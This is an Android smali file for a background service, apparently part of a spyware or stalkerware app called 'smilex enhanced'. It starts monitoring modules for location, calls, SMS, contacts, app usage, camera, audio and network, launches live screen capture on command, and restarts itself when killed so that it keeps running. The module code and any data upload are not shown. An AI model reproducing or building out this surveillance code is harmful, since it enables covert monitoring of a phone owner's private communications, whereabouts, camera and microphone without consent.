.class public Lcom/smilex/enhanced/services/CoreMonitorService;
.super Landroid/app/Service;
.source "CoreMonitorService.java"

.field private mHandler:Landroid/os/Handler;
.field private mRunnable:Ljava/lang/Runnable;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .registers 3
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    # Start as foreground service (Android 8+ requirement)
    invoke-static {p0}, Lcom/smilex/enhanced/utils/ForegroundHelper;->startForeground(Landroid/app/Service;)V

    # Initialize all monitoring modules
    invoke-static {p0}, Lcom/smilex/enhanced/modules/LocationModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/CallModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/SmsModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/AppUsageModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/CameraModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/AudioModule;->init(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/modules/NetworkModule;->init(Landroid/content/Context;)V
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 6
    .param p1, "intent"
    .param p2, "flags"
    .param p3, "startId"

    if-eqz p1, :no_intent

    const-string v0, "action"
    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    const-string v1, "START_LIVE_STREAM"
    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1

    if-eqz v1, :no_intent

    const-string v1, "result_code"
    const/4 v2, 0x0
    invoke-virtual {p1, v1, v2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I
    move-result v1

    const-string v2, "result_data"
    invoke-virtual {p1, v2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;
    move-result-object v2
    check-cast v2, Landroid/content/Intent;

    # Start LiveStreamCaptureService with MediaProjection result
    new-instance v3, Landroid/content/Intent;
    const-class v4, Lcom/smilex/enhanced/services/LiveStreamCaptureService;
    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const-string v4, "result_code"
    invoke-virtual {v3, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;
    const-string v4, "result_data"
    invoke-virtual {v3, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/CoreMonitorService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :no_intent
    const/4 v0, 0x1
    return v0
.end method

.method public onDestroy()V
    .registers 2
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    # Restart service on destroy
    invoke-static {p0}, Lcom/smilex/enhanced/utils/ServiceLauncher;->restartCoreService(Landroid/content/Context;)V
    return-void
.end method
